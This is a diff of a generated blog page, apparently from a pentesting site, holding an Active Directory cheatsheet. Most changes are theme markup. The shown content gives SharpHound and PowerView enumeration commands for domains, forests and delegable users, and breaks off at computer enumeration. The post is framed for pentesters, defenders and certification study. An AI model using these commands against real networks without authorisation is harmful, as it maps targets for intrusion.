@@ -14,6 +14,16 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
@@ -28,27 +38,26 @@
     
 
     
-    <meta name="author" content="karan bhayani" />
+    <meta name="author" content="nomi bhayani" />
     
 
     
-        <meta property="og:title" content="Active Directory Cheatsheet" />
-<meta property="og:description" content="Active Directory (AD) Cheatsheet This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
-This cheatsheet would help some certifications like CRTP, OSCP, PNPT, and such.
-Note: Only a subset of flags and switches, which are most commonly used, are shared." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/ad-cheatsheet/" /><meta property="article:section" content="" />
-<meta property="article:published_time" content="2022-06-12T00:36:33+05:30" />
-<meta property="article:modified_time" content="2022-06-12T00:36:33+05:30" />
-
-
-    
+        <meta property="og:url" content="http://localhost:1313/ad-cheatsheet/">
+  <meta property="og:site_name" content="Welcome to noobsec">
+  <meta property="og:title" content="Active Directory Cheatsheet">
+  <meta property="og:description" content="Active Directory (AD) CheatsheetThis post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2022-06-12T00:36:33+05:30">
+    <meta property="article:modified_time" content="2022-06-12T00:36:33+05:30">
 
     
-        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Active Directory Cheatsheet"/>
-<meta name="twitter:description" content="Active Directory (AD) Cheatsheet This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
-This cheatsheet would help some certifications like CRTP, OSCP, PNPT, and such.
-Note: Only a subset of flags and switches, which are most commonly used, are shared."/>
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Active Directory Cheatsheet">
+  <meta name="twitter:description" content="Active Directory (AD) CheatsheetThis post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -58,18 +67,20 @@ Note: Only a subset of flags and switches, which are most commonly used, are sha
 
 
         
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-171056200-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-VZX99LLTQ8"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-VZX99LLTQ8');
+        }
+      </script>
     
 
     
@@ -84,7 +95,13 @@ if (!doNotTrack) {
             document.documentElement.setAttribute("data-theme", "light");
         }
     </script>
-<script defer src="/js/header.js" integrity=""></script>
+<script defer src="/js/theme-switch.js" integrity=""></script>
+
+
+
+    <script defer src="/js/hide-navbar-on-scroll.js" integrity=""></script>
+
+
 
 
 
@@ -121,98 +138,263 @@ if (!doNotTrack) {
 
 
 
+
+    
 </head>
-<body>
-        <main><header>
-    <div class="brand">
-        <div id="sidebar_btn">
-            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<body><header>
+    <div id="header_content" class="wide">
+        <div id="header_left">
+            <div id="sidebar_btn">
+                <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+                <label id="sidebar_btn_label" for="sidebar_btn_input">
 <svg
     xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
     stroke="currentColor" stroke-width="2" stroke-linecap="round"
     stroke-linejoin="round">
     <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
 </svg>
 
-</svg>
-        </div>
-
-        <div>
-            <a href="/">noobsec</a>
-        </div>
-    </div>
-
-    <div class="toolbox">
-        <div id="theme_tool">
-            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-</svg>
-
-</svg>
-            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-</svg>
-
-</svg>
-        </div>
-
+</label>
+                <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                    <div id="sidebar_canvas_overlay"></div>
+                </label>
+                <div id="sidebar">
+                    <ul><li>
+                                <a href="#">OSCP</a>
+    <ul>
         
-            <div id="search_tool">
-                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-</svg>
 
-</svg><div id="search_menu_wrapper" class="hidden">
-    <div id="search_menu">
-        <div id="search_menu_toolbar">
-            <div id="search_menu_input_wrapper">
-                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">HTB</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Web Attacks</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Cheatsheets</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="/starting-point">Getting Started in Red Team</a></li><li>
+                                <a href="/whoami/">About</a></li></ul>
+                </div>
             </div>
-            <div id="search_menu_close_btn">
-                <svg width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
-</svg>
-
-</svg>
-            </div>
-        </div>
-        <div id="search_menu_results">
-        </div>
-    </div>
-</div>
-</div>
         
-
-        
-    </div>
-</header>
-<nav id="navbar" class="pure-menu">
-    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+            <div class="brand">
+                <div>
+                    <a href="/">noobsec</a>
+                </div>
+            </div><nav id="header_navbar" class="pure-menu header-menu">
+    <ul class="pure-menu-list"><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">OSCP</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -220,6 +402,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -229,6 +412,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -236,6 +420,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -245,6 +430,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -252,6 +438,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -262,11 +449,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">HTB</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -274,6 +462,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -283,6 +472,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -291,6 +481,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -298,6 +489,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -308,11 +500,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Web Attacks</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -320,6 +513,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -329,6 +523,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -336,6 +531,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -345,6 +541,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -354,11 +551,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Cheatsheets</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -366,6 +564,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -375,6 +574,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -382,6 +582,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -391,6 +592,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -398,6 +600,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -408,231 +611,88 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
                     
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/whoami/" class="pure-menu-link">About</a>
                     
                 </li></ul>
 </nav>
-<div id="sidebar_canvas_overlay" class="hidden"></div>
-<div id="sidebar" class="close">
-    <ul><li>
-                    <details>
-                        <summary><a href="#">OSCP</a></summary>
-    <ul>
-        
+</div>
+
+        <div id="header_right">
             
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
+
+            <div id="theme_tool">
+                <button id="dark_mode_btn" class="header-menu-btn outline-button" title='Switch to dark mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</button>
+                <button id="light_mode_btn" class="header-menu-btn outline-button" title='Switch to light mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</button>
+            </div>
+
             
-        
+                <div id="search_tool">
+                    <button id="search_btn" class="header-menu-btn outline-button" title='Search Posts' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</button>
+                </div>
             
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/oscp-journey">OSCP Journey</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/bof">OSCP BOF</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">HTB</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bart">HTB Bart</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-lame">HTB Lame</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Web Attacks</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/file-inclusion">File Inclusion</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x01">SQLi 0x01</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x02">SQLi 0x02</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x03">SQLi 0x03</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Cheatsheets</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <a href="/starting-point">Getting Started in Red Team</a>
-                </li><li>
-                    <a href="/whoami/">About</a>
-                </li></ul>
-</div><div id="content" class="content-margin">
+        </div>
+    </div>
+</header><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1.25rem" height="1.25rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+<main>
+            <div id="content" class="content-margin">
                 
     
-    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+    
+        
+        <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
         
             <nav id="TableOfContents">
   <ul>
@@ -652,10 +712,12 @@ if (!doNotTrack) {
 </nav>
         
     </div></details>
+    
 
 
 
     <div class="content-margin">
+
 
 
 
@@ -665,7 +727,35 @@ if (!doNotTrack) {
         
         
     
-    <h1 id="active-directory-ad-cheatsheet">Active Directory (AD) Cheatsheet</h1>
+
+    
+    
+        
+        
+        
+    
+        
+        
+            
+            
+            
+        
+        <section id="active-directory-ad-cheatsheet">
+
+
+<h1 class="header-anchor-wrapper">Active Directory (AD) Cheatsheet
+  <a href="#active-directory-ad-cheatsheet" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h1>
+
 <p>This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.</p>
 <p>This cheatsheet would help some certifications like <a href="https://www.pentesteracademy.com/activedirectorylab">CRTP</a>, <a href="https://www.offensive-security.com/pwk-oscp/">OSCP</a>, <a href="https://certifications.tcm-sec.com/pnpt/">PNPT</a>, and such.</p>
 <blockquote>
@@ -674,9 +764,55 @@ if (!doNotTrack) {
 <blockquote>
 <p>This is a living document. Last updated: 19 / June / 2022</p>
 </blockquote>
-<h2 id="enumeration">Enumeration</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumeration">
+
+
+<h2 class="header-anchor-wrapper">Enumeration
+  <a href="#enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Initial and lateral movement enumeration</p>
-<h3 id="get-the-dog-out---sharphound--bloodhound">Get the Dog Out - SharpHound + BloodHound</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="get-the-dog-out---sharphound--bloodhound">
+
+
+<h3 class="header-anchor-wrapper">Get the Dog Out - SharpHound + BloodHound
+  <a href="#get-the-dog-out---sharphound--bloodhound" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s have the dog sniff things out because automated enumeration is cool</p>
 <p>The tools used are - <a href="https://github.com/BloodHoundAD/BloodHound/releases/">BloodHound</a>, <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound.exe</a> or <a href="">SharpHound.ps1</a></p>
 <p>Leverage secure LDAP</p>
@@ -696,11 +832,57 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">./SharpHound.exe -d this.domain.local --CollectionMethod All
 </code></pre>
 <p>Next step would be to take this data and then feed it to BloodHound GUI to finally have some fun :)</p>
-<h3 id="getting-hands-dirty---powerview">Getting Hands Dirty - PowerView</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="getting-hands-dirty---powerview">
+
+
+<h3 class="header-anchor-wrapper">Getting Hands Dirty - PowerView
+  <a href="#getting-hands-dirty---powerview" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s have some fun ourselves with manual enumeration.</p>
 <p>We will use PowerView and some net commands to perform enumeration manually.</p>
 <p>Assuming that latest PowerView script (master and dev are the same) has been loaded in memory.</p>
-<h4 id="domain-enumeration">Domain Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="domain-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Domain Enumeration
+  <a href="#domain-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get basic information of the domain</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-Domain
 </code></pre>
@@ -719,14 +901,60 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Get DC IP</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">nslookup &lt;target_dc&gt;
 </code></pre>
-<h4 id="forest-enumeration">Forest Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="forest-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Forest Enumeration
+  <a href="#forest-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get current forest</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-Forest
 </code></pre>
 <p>Get a list of domains</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-ForestDomain [-Forest &lt;target&gt;]
 </code></pre>
-<h4 id="user-enumeration">User Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="user-enumeration">
+
+
+<h4 class="header-anchor-wrapper">User Enumeration
+  <a href="#user-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get a list of users</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetUser [-Domain &lt;target&gt;] [user_name]
 </code></pre>
@@ -750,7 +978,30 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Finding users who can be delegated</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetUser -AllowDelegation
 </code></pre>
-<h4 id="computer-enumeration">Computer Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="computer-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Computer Enumeration
+  <a href="#computer-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get a list of computers</p>
